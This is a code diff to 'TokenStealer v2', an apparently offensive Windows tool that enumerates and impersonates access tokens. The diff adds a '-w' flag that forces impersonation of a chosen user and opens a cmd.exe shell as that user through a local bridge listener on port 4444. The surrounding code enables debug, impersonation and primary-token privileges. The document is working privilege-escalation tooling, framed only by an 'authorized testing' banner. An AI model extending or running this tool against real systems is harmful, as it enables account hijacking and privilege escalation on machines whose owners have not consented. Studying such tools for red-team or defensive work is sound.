@@ -49,6 +49,7 @@ wchar_t* User_to_impersonate = NULL;
 static int num = 0;
 int TokenTypeNeeded = 0;
 BOOL ForceImpersonation = FALSE;
+BOOL ForceBridge = FALSE;
 DWORD SessionId = -1;
 wchar_t WinStationName[256];
 wchar_t** TokenUsers = NULL; // Global ar\ray to store TokenUsers
@@ -1190,6 +1191,7 @@ void usage()
 	printf("    --json          write JSON to stdout (add -e for all columns)\n\n");
 	printf("  Interactive:\n");
 	printf("    -i, --interactive  pick a token with the arrow keys, then run a command\n");
+	printf("    -w                 force impersonation + bridge for -u <user> (no menu)\n");
 	printf("    --nobridge         never use the local 127.0.0.1 bridge\n");
 	printf("    -P, --port <n>     bridge listener port (default 4444)\n\n");
 	printf("  Executing:\n");
@@ -2330,6 +2332,10 @@ int wmain(int argc, WCHAR* argv[])
 				ForceImpersonation = TRUE;
 
 				break;
+			case 'w':
+				ForceBridge = TRUE;
+				ForceImpersonation = TRUE;
+				break;
 			case 'e':
 				extended_list = TRUE;
 
@@ -2426,11 +2432,11 @@ int wmain(int argc, WCHAR* argv[])
 
 	if (!out_csv && !out_json)
 	{
-		printf("TokenStealer v2 2026 - Windows token enumerator / impersonator\n");
-		printf("@decoder_it -> Use only on systems you are authorized to test.\n\n");
+		printf("TokenStealer v2 - Windows token enumerator / impersonator\n");
+		printf("Based on decoder-it/TokenStealer. Use only on systems you are authorized to test.\n\n");
 	}
 
-	if (command == NULL && !list_mode) {
+	if (command == NULL && !list_mode && !ForceBridge) {
 		usage();
 		return 1;
 	}
@@ -2445,7 +2451,20 @@ int wmain(int argc, WCHAR* argv[])
 	HasAssignPriv = EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
 	EnablePriv(hToken, SE_IMPERSONATE_NAME);
 	EnablePriv(hToken, SE_DEBUG_NAME);
-	
+
+	/* -w: force impersonation + bridge for -u <user>, without the menu. */
+	if (ForceBridge)
+	{
+		if (User_to_impersonate == NULL)
+		{
+			printf("[-] -w requires -u <user>.\n");
+			return 1;
+		}
+		RunLocalShellBridge((command != NULL && command[0] != L'\0')
+			? command : L"cmd.exe");
+		return 0;
+	}
+
 	if (pid == 0)
 	{
 		DWORD aProcesses[1024], cbNeeded, cProcesses;
